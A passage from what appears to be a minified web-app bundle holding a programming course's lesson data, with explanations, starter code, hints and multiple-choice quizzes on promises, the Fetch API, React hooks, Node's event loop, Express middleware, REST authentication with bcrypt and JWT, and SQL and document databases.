console.log("end");`,options:["start, timeout, promise, end","start, end, promise, timeout — sync first, then microtasks (promises), then macrotasks (timers)","start, end, timeout, promise","start, promise, end, timeout"],answer:1,explanation:"After the sync stack drains, the event loop empties ALL microtasks (promise callbacks) before touching the timer queue. setTimeout(0) is never 'immediate'."},{prompt:"What does this chain print?",code:`Promise.resolve(1)
  .then((v) => v + 1)
  .then((v) => { console.log(v); return v * 2; })
  .then((v) => console.log(v));`,options:["1 then 2","2 then 4 — each .then transforms the previous return value","2 then 2","undefined then undefined"],answer:1,explanation:"Values flow through the chain: 1 becomes 2, gets logged, becomes 4, gets logged. Whatever a .then callback returns is handed to the next one — that's the chaining model."}],quiz:[{q:"await can be used…",options:["Anywhere in JavaScript","Inside async functions (or top-level in modules)","Only in event handlers","Only with setTimeout"],answer:1,explanation:"await is gated to async function bodies (plus top-level await in modules)."},{q:"While awaiting, the browser…",options:["Freezes completely","Keeps running the event loop — other code proceeds","Reloads the page","Blocks all promises"],answer:1,explanation:"Only the current async function suspends; the page stays responsive."},{q:"res.json() returns…",options:["A plain object","A promise that resolves to parsed JSON","A string","undefined"],answer:1,explanation:"Body parsing is async — that's why you await it twice (fetch, then json)."},{q:"Two independent fetches: fastest pattern?",options:["await a; await b;","Promise.all([a, b]) awaited once","Call them and never await","await a.then(b)"],answer:1,explanation:"Promise.all runs them concurrently — total time ≈ the slower one, not the sum."},{q:"A rejected promise with no .catch becomes…",options:["undefined","An unhandled rejection error","A retry","null"],answer:1,explanation:"Always attach .catch or wrap in try/catch — silent failures are the worst failures."}]},{id:"fetch-api",title:"Fetching Real APIs (with a Mock Server)",minutes:12,body:'The **Fetch API** is how the browser talks to servers:\n\n```\nconst res = await fetch("https://api.example.com/users");\nif (!res.ok) throw new Error("HTTP " + res.status);  // fetch doesn\'t throw on 404s!\nconst data = await res.json();                       // body → JS object\n```\n\n**The two awaits** confuse everyone: `fetch` resolves when *headers* arrive; `res.json()` resolves when the *body* finishes streaming.\n\n**Status codes are the conversation:**\n- `200` OK · `201` Created · `204` No Content\n- `400` Bad Request (your fault) · `401` Unauthorized · `404` Not Found\n- `500`, `502`, `503` — server\'s problem\n\n**Passing options:**\n\n```\nawait fetch(url, {\n  method: "POST",\n  headers: { "Content-Type": "application/json" },\n  body: JSON.stringify({ name: "Ada" }),\n});\n```\n\nThis sandbox has a **mock server** with real latency: `GET /api/users`, `GET /api/users/:id`, `POST /api/users`, `DELETE /api/users/:id`, and a flaky `GET /api/flaky` that fails randomly — perfect for practicing error handling.',starter:`// A mock server lives in this sandbox. Try the CRUD cycle:

async function main() {
  // READ all
  let res = await fetch("/api/users");
  let users = await res.json();
  console.log("users:", users.map((u) => u.name).join(", "));

  // CREATE
  res = await fetch("/api/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Grace", role: "admiral" }),
  });
  const created = await res.json();
  console.log("created:", created.name, "id", created.id, "status", res.status);

  // READ one
  res = await fetch("/api/users/" + created.id);
  const one = await res.json();
  console.log("fetched one:", one.name);

  // DELETE
  res = await fetch("/api/users/" + created.id, { method: "DELETE" });
  console.log("deleted, status:", res.status);

  // ERROR HANDLING — this one fails ~50% of the time
  try {
    res = await fetch("/api/flaky");
    if (!res.ok) throw new Error("HTTP " + res.status);
    console.log("flaky succeeded on this attempt!");
  } catch (err) {
    console.log("caught the failure:", err.message);
  }
}
main();`,check:{expr:"output.includes('created:') && (output.includes('flaky succeeded') || output.includes('caught the failure'))",hint:"Complete the CRUD cycle and make sure the flaky call is wrapped in try/catch so one of the two final lines always appears."},quiz:[{q:"fetch() rejects its promise when…",options:["The server returns 404","The network itself fails — not on HTTP error statuses","The JSON is invalid","A header is missing"],answer:1,explanation:"HTTP 4xx/5xx still 'succeeds' as a response — check res.ok or res.status yourself."},{q:"Why two awaits — fetch() then res.json()?",options:["Style preference","Headers arrive first; the body streams in separately","json() is synchronous","It's a browser bug"],answer:1,explanation:"fetch resolves on headers; res.json() resolves once the full body is parsed."},{q:"Which status means 'you created something'?",options:["200","201","301","404"],answer:1,explanation:"201 Created is the REST convention for successful POSTs."},{q:"What must you do before sending an object in a POST body?",options:["JSON.stringify it and set Content-Type: application/json","Base64 encode it","Nothing — objects send directly","Wrap it in a form"],answer:0,explanation:"Bodies travel as strings — serialize, and declare the content type."},{q:"A 500-series status means…",options:["Your request was bad","The server failed to handle a valid request","You're not logged in","The resource moved"],answer:1,explanation:"5xx = server-side failure; 4xx = client-side problem."}]},{id:"capstone-utility-belt",title:"Capstone: Build Your Utility Belt",minutes:25,body:'Everything from this track in one build. You\'ll write a small **utility library** — the kind of functions real codebases keep in a `utils/` folder — with tests baked into the exercise.\n\n**What you\'re building, function by function:**\n\n```\nformatMoney(1234.5)        // "1,234.50"      — grouping + always 2 decimals\ncamelToTitle("firstName") // "First Name"     — split camelCase into words\nchunk([1,2,3,4,5], 2)     // [[1,2],[3,4],[5]] — batch arrays into groups\ndebounceFlag(logs, 300)   // drops logs within 300ms of the previous one\nuniqueBy(users, "role")   // first user per role — dedupe by a key\n```\n\n**Approach that works:** implement ONE function, run, compare against the expected output in the comments, then move on. Don\'t write all five and start debugging — that\'s how bugs hide in teams.\n\n**Hints, in increasing spoiler level:**\n- `formatMoney`: `toFixed(2)` handles decimals; `Intl.NumberFormat` does grouping in one line\n- `camelToTitle`: `replace(/[A-Z]/g, ...)` or split on the regex /(?=[A-Z])/ — mind the first word\n- `chunk`: slice doesn\'t modify the array; the last chunk may be short\n- `debounceFlag`: track the timestamp of the last KEPT entry\n- `uniqueBy`: a `Map` keyed by the property, keep first-wins\n\nThis is a real portfolio piece: five tested utilities is a genuinely useful thing to have written once, by hand.',starter:`// ─── 1 · formatMoney(1234.5) → "1,234.50" ───────────
function formatMoney(n) {
  // your code
  return n;
}
console.log("formatMoney:", formatMoney(1234.5));      // 1,234.50
console.log("formatMoney:", formatMoney(7));           // 7.00
console.log("formatMoney:", formatMoney(1234567.891)); // 1,234,567.89

// ─── 2 · camelToTitle("firstName") → "First Name" ───
function camelToTitle(s) {
  // your code
  return s;
}
console.log("camelToTitle:", camelToTitle("firstName"));    // First Name
console.log("camelToTitle:", camelToTitle("numberOfUsers")); // Number Of Users

// ─── 3 · chunk([1,2,3,4,5], 2) → [[1,2],[3,4],[5]] ──
function chunk(arr, size) {
  // your code
  return [];
}
console.log("chunk:", JSON.stringify(chunk([1, 2, 3, 4, 5], 2)));   // [[1,2],[3,4],[5]]
console.log("chunk:", JSON.stringify(chunk(["a", "b", "c"], 3)));   // [["a","b","c"]]

// ─── 4 · debounceFlag: keep only logs ≥300ms after the last kept ─
function debounceFlag(logs, gap) {
  // logs: { time, msg }[] sorted by time — return the kept ones
  return [];
}
const logs = [
  { time: 0, msg: "click" },
  { time: 100, msg: "click" },   // within 300 of kept → dropped
  { time: 500, msg: "click" },   // kept
  { time: 600, msg: "click" },   // dropped
];
console.log("debounceFlag times:", debounceFlag(logs, 300).map((l) => l.time).join(",")); // 0,500

// ─── 5 · uniqueBy: first item per key value ─────────
function uniqueBy(items, key) {
  // your code
  return [];
}
const users = [
  { name: "Ada", role: "eng" }, { name: "Lin", role: "design" },
  { name: "Sam", role: "eng" }, { name: "Rey", role: "ops" },
];console.log("uniqueBy:", uniqueBy(users, "role").map((u) => u.name).join(",")); // Ada,Lin,Rey

// TODO: all 9 outputs must match the comments on the right`,check:{expr:"output.includes('1,234.50') && output.includes('7.00') && output.includes('1,234,567.89') && output.includes('First Name') && output.includes('Number Of Users') && output.includes('[[1,2],[3,4],[5]]') && output.includes('debounceFlag times: 0,500') && output.includes('Ada,Lin,Rey')",hint:"formatMoney: n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }). camelToTitle: s.replace(/([A-Z])/g, ' $1') then fix the first word's casing. chunk: loop i += size and arr.slice(i, i + size). debounceFlag: keep if log.time - lastKept.time >= gap. uniqueBy: new Map keyed by item[key] — set only if absent."},quiz:[{q:"In formatMoney, toFixed(2) alone fails because…",options:["It rounds wrong","It adds no thousands separators","It returns a number","It only works on integers"],answer:1,explanation:"toFixed handles decimals but not grouping — toLocaleString or Intl.NumberFormat do both."},{q:"chunk([1,2,3,4,5], 2) — the last chunk has 1 element because…",options:["slice throws on out-of-range ends","slice just returns fewer items when the end overshoots","The loop rounds down","chunk always drops remainders"],answer:1,explanation:"arr.slice(4, 6) on 5 items returns [arr[4]] — slice clamps, it never throws."},{q:"debounceFlag is O(n) because…",options:["It uses a Map","One pass, tracking the last kept timestamp — no rescanning","It sorts first","It's actually O(n²)"],answer:1,explanation:"Each log is compared to the last KEPT one exactly once — constant work per item."},{q:"uniqueBy 'first wins' requires…",options:["Sorting before deduping","Only setting the map entry when the key isn't there yet","Reversing the array","A Set of names"],answer:1,explanation:"map.has(key) ? skip : map.set(key, item) — order of checks decides which item survives."},{q:"The implement-one-then-run discipline prevents…",options:["Syntax errors","Bugs piling up in unknown layers — each failure stays local to one function","The need for tests","Slow execution"],answer:1,explanation:"Five untested functions failing at once gives you five suspects per symptom. Small loops localize failures."}]}]},EP={id:"react",title:"Modern Frontend: React",blurb:"Components, hooks, and the mental model behind every modern interface.",numeral:"Ⅱ",lessons:[{id:"jsx-vdom",title:"JSX & the Virtual DOM",minutes:10,reading:!0,body:'React\'s core idea: **describe the UI for the current state**, and let React update the page.\n\n**JSX** is JavaScript with HTML-like syntax that compiles to function calls:\n\n```\nconst el = <h1 className="title">Hello, {user.name}</h1>;\n// really: React.createElement("h1", { className: "title" }, "Hello, ", user.name)\n```\n\nThe rules: `className` not `class`, braces `{}` embed any expression, and components are just **functions returning JSX**:\n\n```\nfunction Greeting({ name }) {\n  return <h1>Hello, {name}</h1>;\n}\n```\n\n**The Virtual DOM:** React keeps a lightweight JS tree of your UI. On state change it re-renders the component, diffs the new tree against the old one, and patches **only what changed** in the real DOM. You never call DOM APIs for UI updates — no `document.querySelector`, ever, in React code.\n\n**Rendering a list** needs a stable `key` so the diff algorithm tracks identity across re-renders:\n\n```\n{todos.map((todo) => (\n  <li key={todo.id}>{todo.text}</li>\n))}\n```\n\nUse IDs, never array indexes, when items can reorder — index keys confuse the diff and cause state to stick to the wrong row.',quiz:[{q:"JSX compiles down to…",options:["HTML strings","Function calls like React.createElement","Web Components","CSS rules"],answer:1,explanation:"JSX is syntactic sugar over element-creating function calls."},{q:"The Virtual DOM exists to…",options:["Make the DOM faster by patching only what changed","Replace the browser","Store your data","Style components"],answer:0,explanation:"Diffing a JS tree is cheaper than touching the real DOM — React computes the minimal patch."},{q:"Why do lists need key props?",options:["For CSS selectors","So the diff algorithm can track item identity across renders","For TypeScript","Keys are optional decoration"],answer:1,explanation:"Keys tell React which item is which when the list changes."},{q:"Which is correct in JSX?",options:['<div class="box">','<div className="box">','<div css="box">',"<div .box>"],answer:1,explanation:"class is a reserved word in JS, so JSX uses className."},{q:"In React, updating the UI is done by…",options:["Calling document.querySelector directly","Changing state — React re-renders and patches","Editing innerHTML strings","Reloading the page"],answer:1,explanation:"State drives the render; the DOM is React's responsibility."}]},{id:"props-state",title:"Props vs State: The Data Contracts",minutes:10,body:`**Props** are inputs — read-only, passed down, owned by the parent. **State** is memory — owned by the component, changes trigger re-renders.

\`\`\`
function Counter({ label, start = 0 }) {   // props: the contract
  const [count, setCount] = useState(start); // state: the memory
  return (
    <button onClick={() => setCount(count + 1)}>
      {label}: {count}
    </button>
  );
}
\`\`\`

**The golden rule: lift state up.** When two siblings need the same data, the state moves to their closest common parent and flows down as props:

\`\`\`
function App() {
  const [query, setQuery] = useState("");
  return (
    <>
      <SearchBox query={query} onQueryChange={setQuery} />
      <Results query={query} />
    </>
  );
}
\`\`\`

The \`SearchBox\` stays "dumb" — it receives a value and reports changes. That's a **controlled component**: the parent owns truth, the child renders it. Forms work exactly this way (\`value\` + \`onChange\`).

Never mutate props, never mutate state (\`setCount(count + 1)\` not \`count++\`) — React detects changes by **reference**, so always pass a new object/array:

\`\`\`
setTodos([...todos, newTodo]);       // new array ✓
setTodos(todos.push(newTodo));       // mutation ✗ (no re-render)
\`\`\``,starter:`// Plain-JS simulation of useState + props — the model matters, not the library.
let rerenders = 0;

function useState(initial) {
  let value = initial;
  function setValue(next) {
    value = next;
    rerenders++;
  }
  return [() => value, setValue];
}

// A "component" with props (label) and state (count)
function makeCounter(props) {
  const [getCount, setCount] = useState(props.start);
  return {
    click: () => setCount(getCount() + 1),
    render: () => props.label + ": " + getCount(),
  };
}

const counter = makeCounter({ label: "Clicks", start: 0 });
console.log(counter.render());
counter.click();
counter.click();
counter.click();
console.log(counter.render());
console.log("re-renders triggered:", rerenders);`,check:{expr:"output.includes('Clicks: 0') && output.includes('Clicks: 3') && output.includes('re-renders triggered: 3')",hint:"Each click must call setCount — the render should go 0 → 3 with 3 re-renders."},quiz:[{q:"Props are…",options:["Mutable component memory","Read-only inputs owned by the parent","Global variables","DOM attributes only"],answer:1,explanation:"Props are the component's contract — children never rewrite their props."},{q:"Changing state correctly means…",options:["state.push(item)","Calling the setter with a NEW value/array","Editing the state variable directly","Mutating and forcing a render"],answer:1,explanation:"React compares references — mutate in place and it sees 'no change'."},{q:"Two siblings need the same data. You should…",options:["Duplicate state in each","Use a global variable","Lift state to the closest common parent","Pass it through the DOM"],answer:2,explanation:"Lifting state up keeps one source of truth flowing down."},{q:"A controlled input is one where…",options:["The browser owns the value","React state owns the value via value + onChange","The value is read on submit","The input is disabled"],answer:1,explanation:"Value from state, changes reported upward — the parent owns truth."},{q:"Calling setCount(count + 1) twice in a row updates by…",options:["+2 always","Possibly +1 twice if you use the function form: setCount(c => c + 1)","Nothing — state can't change","It throws"],answer:1,explanation:"The updater form (c => c + 1) queues correctly; the value form can batch stale reads."}]},{id:"hooks-effect",title:"Hooks in Depth: useEffect & Friends",minutes:12,sort:{prompt:"Order what React actually does when an effect re-runs.",items:["the component function runs and returns JSX","React commits the new DOM to the screen","the previous effect's cleanup function runs","the new effect callback runs"],explanation:"Render, then commit, then cleanup, then effect. Effects never block the paint — that ordering is exactly why the dependency array matters."},reading:!0,body:'Hooks let function components hold state and perform **side effects**.\n\n**useEffect** runs *after* render for anything outside React: fetching, subscriptions, timers, logging.\n\n```\nuseEffect(() => {\n  const id = setInterval(tick, 1000);\n  return () => clearInterval(id);  // cleanup runs before the next effect + unmount\n}, []);                            // dependency array\n```\n\nThe dependency array is the whole contract:\n- **`[]`** — run once on mount\n- **`[userId]`** — re-run when userId changes (cleanup first!)\n- **none** — run after *every* render (rarely what you want)\n\n**Other core hooks:**\n- `useRef` — a mutable box that survives re-renders *without* triggering one; also grabs DOM nodes (`inputRef.current.focus()`).\n- `useContext` — read a context value without prop-drilling through every layer.\n- `useReducer` — `useState` with a formal reducer: `dispatch({ type: "add", item })` → pure `(state, action) => newState`. Prefer it when state transitions get complex.\n\n**The rules of hooks:** call them unconditionally at the top level — same order every render. No hooks inside `if`, loops, or nested functions; React tracks hooks by call order.\n\n**Custom hooks** are functions starting with `use` that compose other hooks — extract shared logic, not shared markup:\n\n```\nfunction useDebounced(value, ms) {\n  const [v, setV] = useState(value);\n  useEffect(() => {\n    const t = setTimeout(() => setV(value), ms);\n    return () => clearTimeout(t);\n  }, [value, ms]);\n  return v;\n}\n```',quiz:[{q:"useEffect with [] runs…",options:["After every render","Once, after mount","Never","Before render"],answer:1,explanation:"Empty deps = mount-only (plus unmount cleanup)."},{q:"The cleanup function returned by an effect runs…",options:["Never","Before the next effect run and on unmount","Only on errors","After unmount only"],answer:1,explanation:"Cleanup prevents leaks — unsubscribe before re-subscribing."},{q:"useRef is for…",options:["Re-rendering on change","A mutable value/DOM handle that doesn't trigger renders","Replacing useState everywhere","Caching API calls"],answer:1,explanation:"Refs persist across renders silently — timers, previous values, DOM nodes."},{q:"Which violates the rules of hooks?",options:["Calling useState at the top of a component","Calling useEffect inside an if block","Calling two hooks in a row","Using a custom hook"],answer:1,explanation:"Hooks must run in the same order every render — conditionals break the mapping."},{q:"Choose useReducer over useState when…",options:["You have one boolean","State transitions are complex and multi-step","You want faster renders","Never — they're identical"],answer:1,explanation:"Reducers centralize transition logic as pure functions — testable and predictable."}]},{id:"react-styling-routing",title:"Tailwind, Routing & App Architecture",minutes:11,reading:!0,body:`**Tailwind CSS** is utility-first: no naming games, composition happens in markup.

\`\`\`
<button class="rounded-full bg-ink-950 px-6 py-2.5 font-semibold text-white hover:shadow-lg transition">
  Get started
</button>
\`\`\`

- Utilities map 1:1 to CSS properties (\`px-6\` = padding-x 24px, \`md:\` prefix = breakpoint).
- Extract repeated patterns into a component, not a CSS class — **reuse via React, not via class names**.
- Design tokens live in \`tailwind.config.js\` — that's your design system.

**Routing with React Router** maps URLs to components without a page reload:

\`\`\`
<Routes>
  <Route path="/" element={<Landing />} />
  <Route path="/lessons/:id" element={<Lesson />} />
</Routes>

// in Lesson: read the URL
const { id } = useParams();
const navigate = useNavigate();
navigate("/lessons/2");
\`\`\`

**This app is a worked example** — look at its structure:
- \`App.tsx\` — routes only
- \`pages/\` — route-level screens
- \`components/\` — reusable pieces (Nav, Quiz, Playground)
- \`data/\` — curriculum as typed data, separate from UI
- \`lib/\` — pure logic (sandbox runner, progress)

**State management pattern ladder:** local \`useState\` first → lifted state for siblings → \`useContext\` for app-wide low-frequency values (theme, auth user) → a store (Zustand/Redux) only when context causes re-render pain. Most apps never need the last rung.`,quiz:[{q:"Tailwind's philosophy is…",options:["Write CSS in separate files","Compose styles from small utility classes in markup","Inline style attributes","No CSS at all"],answer:1,explanation:"Utilities like flex and px-4 compose in JSX; extraction happens at the component level."},{q:"Repeated Tailwind patterns should be extracted as…",options:["A CSS class with @apply everywhere","A React component","A utility function","A media query"],answer:1,explanation:"Reuse lives in components — that's the Tailwind-recommended pattern."},{q:"useParams() returns…",options:["Component props","Dynamic route segments like :id from the current URL","Query strings only","Form values"],answer:1,explanation:"It reads path parameters from the matched route."},{q:"The recommended state management escalation is…",options:["Redux first, always","useState → lifted state → context → external store","Context for everything","localStorage only"],answer:1,explanation:"Start local; reach for heavier tools only when the simpler tier hurts."},{q:"In this codebase, curriculum content lives in…",options:["Component JSX","src/data as typed data structures","CSS files","The URL"],answer:1,explanation:"Data/UI separation — pages render whatever tracks.ts contains."}]}]},RP={id:"backend",title:"Backend Systems & APIs",blurb:"Node.js, Express, REST design, auth, and databases that don't fall over.",numeral:"Ⅲ",lessons:[{id:"node-event-loop",title:"Node.js & the Event Loop",minutes:10,body:`Node.js is a single JavaScript thread that never waits. Its power comes from **non-blocking I/O**: ask for a file/database/network response, hand over a *callback*, and keep serving other requests while the OS works.

\`\`\`
// blocking — the whole server stalls 2s per call
const data = fs.readFileSync("big.json");

// non-blocking — the thread stays free
fs.readFile("big.json", (err, data) => { … });
\`\`\`

**The event loop** is the scheduler that makes this possible. Each loop iteration (tick) runs phases in order — timers (\`setTimeout\`) → pending callbacks → **poll** (I/O events) → check (\`setImmediate\`) → close — and *only then* the **microtask queue**: promise callbacks (\`.then\`, \`await\` continuations) drain after each macrotask, before the next one starts.

\`\`\`
console.log("1 sync");
setTimeout(() => console.log("4 timeout"), 0);
Promise.resolve().then(() => console.log("3 promise"));
console.log("2 sync");
// order: 1, 2, 3, 4 — microtasks beat timers
\`\`\`

**Why your server dies:** one blocking call (a huge loop, sync file I/O, an expensive regex) freezes *every* client. Rule: never block the thread. Offload CPU-heavy work to worker threads.

Run this — predict the order *before* pressing Run.`,starter:`console.log("1: sync code runs first");

setTimeout(() => {
  console.log("5: timeout (macrotask)");
}, 0);

Promise.resolve().then(() => {
  console.log("4: promise (microtask — before timers!)");
});

queueMicrotask(() => console.log("3: queueMicrotask (microtask)"));

for (let i = 0; i < 3; i++) {
  console.log("2: sync loop pass", i);
}

console.log("done scheduling — event loop takes over");`,check:{expr:"output.includes('4: promise') && output.includes('5: timeout') && output.indexOf('4: promise') < output.indexOf('5: timeout')",hint:"Microtasks (promises) must print BEFORE the timeout — if not, check your understanding of the loop."},predict:[{prompt:"In what order do these lines print in Node?",code:`console.log("1: sync");
setTimeout(() => console.log("2: timeout"), 0);
Promise.resolve().then(() => console.log("3: promise"));
console.log("4: sync");`,options:["1, 2, 3, 4 — setTimeout(0) runs immediately after","1, 4, 3, 2 — sync code, then microtasks (promises), then macrotasks (timers)","1, 4, 2, 3 — timers always beat promises","1, 3, 4, 2"],answer:1,explanation:"The event loop drains ALL microtasks (promise callbacks) after the sync stack finishes, before touching the timer queue. This exact ordering question shows up in half of all Node interviews."},{prompt:"What does this middleware chain print when a request arrives?",code:`// a 10-line model of Express middleware
const stack = [];
const app = {
  use(fn) { stack.push(fn); },
  handle() {
    let i = 0;
    const next = () => { if (i < stack.length) stack[i++](next); };
    next();
  },
};
app.use((next) => { console.log("A"); next(); console.log("B"); });
app.use((next) => { console.log("C"); next(); });
app.handle();`,options:["A C B — the stack unwinds after next()","A B C","A C","C A B"],answer:0,explanation:"Middleware is an onion: A runs, next() descends to C, and when the inner layer returns, B runs on the way back out. That's why timing code goes AFTER next() — it measures the whole inner stack."}],quiz:[{q:"Node's default model is…",options:["One thread per request","A single thread with non-blocking I/O","Threads with shared memory","Blocking until each request finishes"],answer:1,explanation:"The event loop multiplexes thousands of concurrent connections on one thread."},{q:"Promise callbacks (microtasks) run…",options:["After all timers","After the current macrotask, before the next one","In the next frame","Immediately, skipping the queue"],answer:1,explanation:"Microtasks drain completely between macrotasks — that's why 3 beats 4."},{q:"Which blocks the event loop?",options:["await fetch(...)","A 5-second while loop","setTimeout(..., 5000)","Reading a file with a callback"],answer:1,explanation:"Only synchronous CPU work blocks; async I/O yields to the loop."},{q:"fs.readFileSync in a request handler causes…",options:["Faster reads","Every other request to stall until the read finishes","A syntax error","Automatic parallelism"],answer:1,explanation:"Sync I/O holds the thread hostage — the cardinal sin of Node servers."},{q:"setImmediate callbacks run…",options:["Before promises","In the check phase, after I/O polling","Only in browsers","Before sync code"],answer:1,explanation:"setImmediate schedules for the check phase; setTimeout(0) lands in the timers phase of a later tick."}]},{id:"express-middleware",title:"Express & the Middleware Pipeline",minutes:10,sort:{prompt:"Order the request as it flows down the middleware pipeline.",items:["logger middleware logs the request","express.json() parses the body into req.body","auth middleware attaches req.user or rejects","the route handler builds the response","error middleware catches whatever threw"],explanation:"Order is everything: parse before you read the body, authenticate before you trust the caller, and register error handlers last so they catch failures from everything above."},body:`Express is a **pipeline**: each request flows through middleware — functions with \`(req, res, next)\` — until one responds.

\`\`\`
app.use(logger);              // 1. every request gets logged
app.use(express.json());      // 2. JSON bodies parsed into req.body
app.use(auth);                // 3. attaches req.user or rejects

app.get("/api/users", listUsers);   // 4. route handlers last
\`\`\`

Order is everything — middleware runs **top to bottom**. \`next()\` passes control forward; responding ends the flow. Forgetting \`next()\` or a response = the request hangs.

\`\`\`
function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ error: "unauthorized" });
  req.user = verify(token);   // enrich the request
  next();                     // continue down the pipeline
}
\`\`\`

**A REST route is just a route + verbs:**

\`\`\`
app.get("/api/todos", handler);          // list
app.post("/api/todos", handler);         // create
app.put("/api/todos/:id", handler);      // replace
app.patch("/api/todos/:id", handler);    // partial update
app.delete("/api/todos/:id", handler);   // destroy

app.get("/api/todos/:id", (req, res) => {
  const todo = db.find(req.params.id);
  if (!todo) return res.status(404).json({ error: "not found" });
  res.status(200).json(todo);
});
\`\`\`

Below: a tiny middleware pipeline simulator — watch a request flow through.`,starter:`// Mini Express: middleware pipeline in 15 lines
function createApp() {
  const stack = [];
  return {
    use(fn) { stack.push(fn); },
    handle(req) {
      const log = [];
      let i = 0;
      const res = { status: (s) => { log.push("→ respond " + s); } };
      const next = () => {
        const fn = stack[i++];
        if (!fn) { log.push("→ 404 (fell off the pipeline)"); return; }
        fn(req, res, next);
      };
      next();
      return log.join("\\n");
    },
  };
}

const app = createApp();
app.use((req, res, next) => { console.log("1. logger: " + req.method + " " + req.url); next(); });
app.use((req, res, next) => { console.log("2. auth: token=" + (req.token ? "ok" : "missing")); next(); });
app.use((req, res, next) => { if (!req.token) { console.log("3. guard rejects"); return res.status(401); } next(); });
app.use((req, res) => { console.log("4. handler reached"); res.status(200); });

console.log("--- request WITHOUT token ---");
console.log(app.handle({ method: "GET", url: "/api/todos" }));
console.log("--- request WITH token ---");
console.log(app.handle({ method: "GET", url: "/api/todos", token: "abc123" }));`,check:{expr:"output.includes('guard rejects') && output.includes('4. handler reached')",hint:"The guard must reject the token-less request (401) and let the tokened request reach the handler."},quiz:[{q:"Middleware runs…",options:["In random order","In the order it was registered","Parallel","On demand only"],answer:1,explanation:"The stack is a queue — registration order is execution order."},{q:"If middleware never calls next() or responds, the request…",options:["Retries","Hangs forever","Gets 500","Skips to the router"],answer:1,explanation:"Nothing continues the pipeline — the client waits until timeout."},{q:"req.body is undefined before express.json() because…",options:["Express is broken","The body-parsing middleware hasn't run yet in the pipeline","Bodies never parse","It only works in POST"],answer:1,explanation:"Parsing is middleware — it must be registered before the routes that need it."},{q:"req.params.id in '/api/todos/:id' holds…",options:["The query string","The :id path segment","The whole URL","The request body"],answer:1,explanation:"Named route segments become req.params keys."},{q:"Correct REST mapping for 'update one todo partially'?",options:["POST /todos","PATCH /todos/:id","GET /todos/:id/edit","PUT /todos"],answer:1,explanation:"PATCH = partial update of a specific resource."}]},{id:"rest-auth",title:"REST Design, Hashing & JWT",minutes:12,reading:!0,body:`**REST in one sentence:** URLs are *nouns* (resources), HTTP verbs are the actions, status codes are the verdict.

\`\`\`
GET    /api/articles        → 200 [ … ]        list
POST   /api/articles        → 201 { … }        create
GET    /api/articles/42     → 200 { … }        read one
PATCH  /api/articles/42     → 200 { … }        update
DELETE /api/articles/42     → 204 _            delete
GET    /api/articles/99     → 404 { error }    nope
POST   /api/articles (bad)  → 400 { error }    validation failed
\`\`\`

Version your API (\`/api/v1/\`), pluralize resources, and filter with query strings (\`?page=2&limit=20\`), not new endpoints.

**Passwords are never stored — only their hashes.**

\`\`\`
const hash = await bcrypt.hash(password, 12);   // salt is baked in
const ok = await bcrypt.compare(password, hash);
\`\`\`

bcrypt is *deliberately slow* + salted, so stolen hashes can't be brute-forced or rainbow-tabled. Never MD5/SHA a password; never log passwords.

**JWT (JSON Web Token)** = stateless auth. Server signs \`{ userId, exp }\`; client sends it as \`Authorization: Bearer <token>\`; server verifies the signature — **no session storage needed**.

\`\`\`
const token = jwt.sign({ userId: user.id }, SECRET, { expiresIn: "15m" });
const payload = jwt.verify(token, SECRET);   // throws if forged/expired
\`\`\`

Rules: short-lived access tokens, refresh tokens to renew, secrets in environment variables (never in git), and HTTPS everywhere — a token sniffed in transit is game over.`,quiz:[{q:"POST /api/articles succeeds. Status?",options:["200","201","204","302"],answer:1,explanation:"201 Created — the response also echoes the new resource."},{q:"Why bcrypt over SHA-256 for passwords?",options:["It's newer","It's slow by design and salts automatically","It's shorter","SHA-256 is illegal"],answer:1,explanation:"Fast hashes make brute-force cheap; bcrypt's cost factor slows attackers to a crawl."},{q:"JWTs are 'stateless' because…",options:["They expire instantly","The server needs no session store — the signature proves validity","They store the database","They never leave the server"],answer:1,explanation:"Verification is pure math on the token itself — scale horizontally without shared sessions."},{q:"Where does the JWT secret belong?",options:["In the repo","In client-side code","In an environment variable","In the JWT itself"],answer:2,explanation:"Secrets in env vars, injected at deploy — never committed."},{q:"GET /api/users?limit=20&page=3 is…",options:["Bad practice — make /api/users/page/3","Standard REST pagination via query parameters","A GraphQL query","An invalid URL"],answer:1,explanation:"Filters, sorts, and pagination belong in query strings — one resource, many views."}]},{id:"databases",title:"Databases: SQL, Documents & ORMs",minutes:12,reading:!0,body:`**Relational (PostgreSQL)** — data as typed tables; relations are first-class; joins are the superpower.

\`\`\`
SELECT users.name, COUNT(orders.id) AS order_count
FROM users
LEFT JOIN orders ON orders.user_id = users.id
WHERE users.country = 'DE'
GROUP BY users.name
ORDER BY order_count DESC
LIMIT 10;
\`\`\`

Schema, constraints (\`FOREIGN KEY\`, \`NOT NULL\`, \`UNIQUE\`) mean the *database* rejects bad data — not just your app code.

**Document (MongoDB)** — JSON-ish documents, schema-flexible, nested data reads in one fetch:

\`\`\`
db.users.insertOne({ name: "Ada", tags: ["admin", "beta"], profile: { bio: "…" } });
db.users.find({ tags: "admin" });
\`\`\`

**Choosing:** multi-entity data with relations and reporting (money, orders, users) → SQL. Rapidly evolving/nested documents (content, catalogs, event logs) → Mongo. Postgres's JSONB makes it surprisingly good at both — when unsure, start Postgres.

**Indexes** are the difference between scanning a million rows and touching three:

\`\`\`
CREATE INDEX idx_orders_user ON orders(user_id);   -- lookup by user: instant
\`\`\`

Index what you filter/join/sort on; every index slightly slows writes. No index on \`orders.user_id\` = full table scan per user page.

**ORMs** (Prisma for SQL, Mongoose for Mongo) map code objects to rows/documents:

\`\`\`
// Prisma: type-safe, no SQL strings
const users = await prisma.user.findMany({
  where: { country: "DE" },
  include: { orders: true },
});
\`\`\`

